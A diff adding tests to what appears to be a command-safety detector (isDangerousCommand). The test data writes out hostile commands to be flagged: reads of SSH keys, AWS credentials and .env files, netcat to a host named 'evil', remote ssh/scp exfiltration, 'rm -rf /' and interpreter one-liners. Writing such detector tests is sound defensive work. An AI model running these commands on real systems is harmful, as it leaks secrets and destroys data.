@@ -18,6 +18,18 @@ describe("dangerous-commands — exfil / arbitrary-exec primitives (v14.8.12)", 
     expect(isDangerousCommand("python3 manage.py test")).toBe(false);
   });
 
+  it("flags interpreter-eval evasions the exact-name list missed (A7/H-6)", () => {
+    expect(isDangerousCommand("python2 -c 'x'")).toBe(true);
+    expect(isDangerousCommand("python3.11 -c 'x'")).toBe(true);
+    expect(isDangerousCommand("nodejs -e '1'")).toBe(true);
+    expect(isDangerousCommand("pypy -c 'x'")).toBe(true);
+    expect(isDangerousCommand("php -r 'phpinfo();'")).toBe(true);
+    expect(isDangerousCommand("Rscript -e '1'")).toBe(true);
+    expect(isDangerousCommand("jruby -e 'x'")).toBe(true);
+    // still benign: running a file with a versioned interpreter
+    expect(isDangerousCommand("python3.11 app.py")).toBe(false);
+  });
+
   it("flags remote-shell / netcat / GitHub-write exfil channels", () => {
     expect(isDangerousCommand("ssh host 'cat /etc/passwd'")).toBe(true);
     expect(isDangerousCommand("scp secret.txt host:/tmp")).toBe(true);
@@ -36,9 +48,32 @@ describe("dangerous-commands — exfil / arbitrary-exec primitives (v14.8.12)", 
     expect(isDangerousCommand("cat package.json")).toBe(false);
   });
 
+  it("credential detection is reader-agnostic — path is the invariant (A7/H-6)", () => {
+    // Readers not on the old blocklist (awk/sort/cut/grep) and copy-then-read
+    // must still be flagged when they touch a credential path.
+    expect(isDangerousCommand("awk '{print}' ~/.aws/credentials")).toBe(true);
+    expect(isDangerousCommand("sort ~/.ssh/id_ed25519")).toBe(true);
+    expect(isDangerousCommand("cp ~/.ssh/id_rsa /tmp/x")).toBe(true);
+    expect(isDangerousCommand("grep KEY .env")).toBe(true);
+    expect(isDangerousCommand("find / -name id_rsa")).toBe(true);
+  });
+
+  it("flags reads of .env files (A17) but not similarly-named non-secrets", () => {
+    expect(isDangerousCommand("cat .env")).toBe(true);
+    expect(isDangerousCommand("cat .env.local")).toBe(true);
+    expect(isDangerousCommand("head -n5 .env.production")).toBe(true);
+    expect(isDangerousCommand("cat path/to/.env")).toBe(true);
+    // `.env` boundary: `.environment` is not a secret-file read.
+    expect(isDangerousCommand("cat .environment.md")).toBe(false);
+    expect(isDangerousCommand("cat README.md")).toBe(false);
+  });
+
   it("still catches these when hidden behind a benign prefix (compound)", () => {
     expect(isDangerousCommand("echo hi && ssh host rm -rf /")).toBe(true);
     expect(isDangerousCommand("ls; nc evil 80")).toBe(true);
+    // Single `&` background operator (H-3): the danger after it is still caught.
+    expect(isDangerousCommand("echo ok & kill -9 1")).toBe(true);
+    expect(isDangerousCommand("echo ok & nc evil 80")).toBe(true);
   });
 });
 
